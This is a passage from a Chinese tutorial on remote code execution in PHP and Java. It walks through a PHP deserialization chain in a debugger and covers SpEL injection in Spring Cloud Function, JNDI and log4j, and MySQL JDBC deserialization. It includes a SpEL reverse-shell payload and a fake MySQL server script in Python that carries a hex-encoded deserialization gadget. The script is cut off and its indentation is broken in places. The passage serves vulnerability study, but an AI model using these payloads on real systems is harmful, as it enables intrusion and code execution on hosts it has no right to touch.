成功拿下rce
因为这个反序列化网上教程都是静态硬审的，所以非常不好理解，为了便于理解，我们可以使用xdebug配合phpstorm进行动态调试，更好地理解参数传递的过程
Php.ini文件：
然后开启监听，burp打上payload开始跟
入口进来
然后param函数，获取到了一些方法之类的参数
跟到input
getFilter
反序列化入口点
调用__destruct
removeFiles
调用了toString
然后跟进tojson
继续跟进toArray
然后就是getAttr
getData
getRelation
然后跳过几个无用步骤，进到了call
isAjax
然后再跳到param
然后再跳几下，就到了appShutdown结束
这就是一个大致的流程，理论还是按照静态审的来，也可以动态自己跟着走一遍可以理解（这里用的都是f8，如果要跟的更加深入一点可以f7进入每个方法的模块一点点看，我这里跳步比较多，所以还是推荐自己去跟一下深入理解）
Php说了这么多，那么再来稍微说下java，因为我java学的并不是很多，所以这里只是简单写几个案例，先来说一下java和php不同的地方，php中的exec，就相当于正常的cmd了，但是在java中却不一样，如下，单纯一个whoami可以正常执行
但是当我们用管道符拼接的时候发现，报错了，这是因为Runtime.getRuntime().exec将里面的参数当成一个完整的字符串了，而不是管道符分割的两个命令，那么也就不能像php一样进行拼接rce了，这也是体现java安全性高的一点（当然如果开发直接把参数代入了也是可以的，但是我没找到这样的java案例，这里有个坑点，记得加exec.waitFor，不然执行不成功的，也可能单纯是我环境的问题）
但是用cmd /c是可以的，不过如果开发写的是ping 加参数依旧是不能直接拼接的，必须command全部参数都可控才行
## **11 表达式注入**
然后就是java的表达式注入，这里用最近的Spring Cloud
Function的spel表达式注入做测试（因为好找靶场，本地环境一直搭不起来）（除了spel还有OGNL,MVEL,EL等，这里只用spel举例做测试）
先看一个简单的demo，这里我们发现12行的expression代入到了13行的parseExpression中，可以解析java.lang.Runtime类，那么我们就可以直接执行命令
后面就是反弹shell了，网上文章较多，大家自行测试
T(java.lang.Runtime).getRuntime().exec("bash -c
{echo,base64加密的shell}|{base64,-d}|{bash,-i}")
原理分析，参考（https://www.t00ls.cc/thread-65356-1-1.html）
这里获取post，然后将参数转到processRequest
往下跟进processRequest
注意这里是header，这也是为啥payload在header中传输
然后跟进apply进去
传进来的数据跟进doApply，在进去doApply方法看
跟进apply
发现参数到了route,在跟进route
判断请求头有没有spring那段，如果有的话就进入到functionFromExpression里代入，那我们进去这个函数看一下
跟开头一样，这里的parseExpression直接带入进来解析，所以也就成功的rce了
## **12 JNDI注入**
这里的jndiName可控，我们就可以直接造成Rce
“RMI（Remote Method Invocation），是一种跨JVM实现方法调用的技术。
在RMI的通信方式中，由以下三个大部分组成：
Client
Registry
Server
其中Client是客户端，Server是服务端，而Registry是注册中心。
客户端会Registry取得服务端注册的服务，从而调用服务端的远程方法。
注册中心在RMI通信中起到了一个什么样的作用？我们可以把他理解成一个字典，一个负责网络传输的模块。
服务端在注册中心注册服务时，需要提供一个key以及一个value，这个value是一个远程对象，Registry会对这个远程对象进行封装，使其转为一个远程代理对象。当客户端想要调用远程对象的方法时，则需要先通过Registry获取到这个远程代理对象，使用远程代理对象与服务端开放的端口进行通信，从而取得调用方法的结果。”
Jndi注入最知名的案例应该就是log4j了
原理分析
解开jar包
入口
主要是127-132这段
127逻辑进去后，129行判断字符串中是否包含 ${ 如果包含，就将从这个字符开始一直到字符串结束替换为下面的值，然后就是132替换值的地方
跟进getStrSubstitutor()
## **13 JDBC反序列化**
Java还有一种独有的RCE方法就是JDBC可控配合反序列化的RCE
官网下载8.0.12版本：https://downloads.mysql.com/archives/c-j/
看着两个参数组成的payload
官方介绍
queryInterceptors：一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的类），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）；
autoDeserialize：自动检测与反序列化存在BLOB字段中的对象；
设置为com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor这个类之后，每次执行查询语句，都会调用拦截器的preProcess和postProcess方法
看到
\mysql-connector-java-8.0.12\src\main\user-impl\java\com\mysql\cj\jdbc\interceptors\ServerStatusDiffInterceptor.java
文件中的preProcess里的populateMapWithSessionStatusValues，跟进这个函数
跟进去之后发现先执行了show session status，然后传到resultSeToMap中，跟进这个函数
我们可以看到在resultSeToMap中出现了getObject
这里跟进的是
\mysql-connector-java-8.0.12\src\main\user-impl\java\com\mysql\cj\jdbc\result\ResultSetImpl.java
可以看到try语句中存在readObject
最后贴上 Tri0mphe7师傅的脚本
    # -*- coding:utf-8 -*-    #@Time : 2020/7/27 2:10
    #@Author: Tri0mphe7
    #@File : server.py
    import socket
    import binascii
    import os
    greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
    response_ok_data="0700000200000002000000"
    def receive_data(conn):
        data = conn.recv(1024)
        print("[*] Receiveing the package : {}".format(data))
        return str(data).lower()
    def send_data(conn,data):
        print("[*] Sending the package : {}".format(data))
        conn.send(binascii.a2b_hex(data))
    def get_payload_content():
    //file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  "calc" > a
        file= r'a'
        if os.path.isfile(file):
            with open(file, 'rb') as f:
                payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
            print("open successs")
        else:
            print("open false")
            #calc
    payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
        return payload_content
    # 主要逻辑
    def run():
        while 1:
            conn, addr = sk.accept()
            print("Connection come from {}:{}".format(addr[0],addr[1]))
            # 1.先发送第一个问候报文
            send_data(conn,greeting_data)
            while True:
                # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
                receive_data(conn)
                send_data(conn,response_ok_data)
                #其他过程
                data=receive_data(conn)
                #查询一些配置信息,其中会发送自己的 版本号
                if "session.auto_increment_increment" in data:
    _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                    send_data(conn,_payload)
                    data=receive_data(conn)
                elif "show warnings" in data:
     _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                    send_data(conn, _payload)
                    data = receive_data(conn)
                if "set names" in data:
                    send_data(conn,response_ok_data)